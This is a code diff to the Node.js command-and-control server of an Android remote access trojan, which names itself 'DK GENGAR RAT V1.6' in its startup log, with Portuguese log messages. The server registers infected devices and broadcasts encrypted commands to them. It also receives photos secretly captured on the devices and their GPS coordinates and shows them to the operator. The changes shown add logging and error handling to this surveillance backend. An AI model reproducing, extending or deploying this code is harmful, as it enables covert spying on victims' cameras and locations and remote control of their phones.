@@ -24,6 +24,7 @@ function decrypt(encryptedValue) {
         decrypted = Buffer.concat([decrypted, decipher.final()]);
         return decrypted.toString();
     } catch (e) {
+        console.error("[ERRO DESCRIPTOGRAFIA]", e.message);
         return null;
     }
 }
@@ -50,20 +51,27 @@ app.get("/health", (req, res) => {
 });
 
 io.on("connection", (socket) => {
-    console.log("Nova conexão estabelecida");
+    console.log(`[SISTEMA] Nova conexão: ${socket.id}`);
 
     socket.on("register", (encryptedData) => {
+        console.log(`[SISTEMA] Recebido evento de registro de ${socket.id}`);
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            console.log("Dispositivo registrado:", data.model);
-            io.emit("new_device", data);
+            try {
+                const data = JSON.parse(decrypted);
+                console.log(`[REGISTRO SUCESSO] Dispositivo: ${data.model} | OS: ${data.os}`);
+                socket.deviceData = data;
+                io.emit("new_device", data);
+            } catch (e) {
+                console.error("[ERRO JSON] Falha ao processar JSON de registro:", e.message);
+            }
+        } else {
+            console.error("[ERRO REGISTRO] Falha ao descriptografar dados de registro de " + socket.id);
         }
     });
 
     socket.on("command", (data) => {
-        console.log("Comando enviado:", data.cmd);
-        // Criptografa o comando antes de enviar para o APK
+        console.log(`[COMANDO] ${data.cmd} enviado para os dispositivos`);
         const encryptedCmd = encrypt(JSON.stringify(data));
         socket.broadcast.emit("command", encryptedCmd);
     });
@@ -71,35 +79,44 @@ io.on("connection", (socket) => {
     socket.on("result", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            io.emit("server_log", data.msg);
+            try {
+                const data = JSON.parse(decrypted);
+                console.log(`[RESULTADO] ${data.msg}`);
+                io.emit("server_log", data.msg);
+            } catch (e) {}
         }
     });
 
     socket.on("photo_captured", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            io.emit("display_photo", data.image);
-            io.emit("server_log", "📸 Foto recebida com sucesso!");
+            try {
+                const data = JSON.parse(decrypted);
+                console.log("[MÍDIA] Foto recebida");
+                io.emit("display_photo", data.image);
+                io.emit("server_log", "📸 Foto recebida com sucesso!");
+            } catch (e) {}
         }
     });
 
     socket.on("location_received", (encryptedData) => {
         const decrypted = decrypt(encryptedData);
         if (decrypted) {
-            const data = JSON.parse(decrypted);
-            io.emit("display_location", data);
-            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
+            try {
+                const data = JSON.parse(decrypted);
+                console.log(`[GPS] Lat: ${data.lat}, Lon: ${data.lon}`);
+                io.emit("display_location", data);
+                io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
+            } catch (e) {}
         }
     });
 
     socket.on("disconnect", () => {
-        console.log("Conexão encerrada");
+        console.log(`[SISTEMA] Conexão encerrada: ${socket.id}`);
     });
 });
 
 const PORT = process.env.PORT || 8080;
 server.listen(PORT, () => {
-    console.log("DK GENGAR RAT V1.6 rodando na porta " + PORT);
+    console.log(`DK GENGAR RAT V1.6.1 rodando na porta ${PORT}`);
 });
